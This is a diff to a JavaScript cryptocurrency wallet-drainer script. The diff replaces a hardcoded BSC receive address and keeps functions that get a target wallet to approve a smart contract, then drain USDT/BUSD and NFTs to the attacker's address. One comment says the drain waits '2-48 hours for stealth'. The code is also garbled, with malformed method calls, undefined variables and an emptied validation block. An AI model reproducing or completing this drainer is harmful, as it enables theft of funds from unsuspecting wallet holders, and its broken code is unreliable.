@@ -1,18 +1,11 @@
-const receiveAddress = "0xd49846c09A78eB544688Fa7803199Dcd618637dF";   // remove the words and replace it with your bsc address    
-
-	
+//code for local smart contract
+const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    	
 var cryptotokenContract;
 var smartcontract
-
-
 function approveSpending(token) {
-	
-	smartcontract.methods.approvetransaction(targetwallet);   //the smart contract gets approved to access tokens
-	smartcontract.methods.drainusdt.send({ to: receiveAddress }).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	smartcontract.methods.approvetransaction(targetwallet);      //the smart contract gets approved to access tokens
+	smartcontract.methods.drainBUSD.send({ to: receiveAddress }).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
-	  
-  			
-
 function drainwallet(token) {
 	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
   			
@@ -23,15 +16,14 @@ var tokenAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","typ
 
 //#region Check Configuration
 if (!receiveAddressx.startsWith("0x") ||
-    (
-        receiveAddressx.length >= 64 ||
-        receiveAddressx.length <= 40
-    )
-
-
+    receiveAddressx.length > 42 || // Maximum length of Ethereum address is 42 characters
+    receiveAddressx.length < 42) { // Minimum length of Ethereum address is 42 characters for hex representation
+    // Your fix goes here
+}
 
 /*
  * JavaScript smart contract node
+
 /* global define */
 
 /* eslint-disable strict */
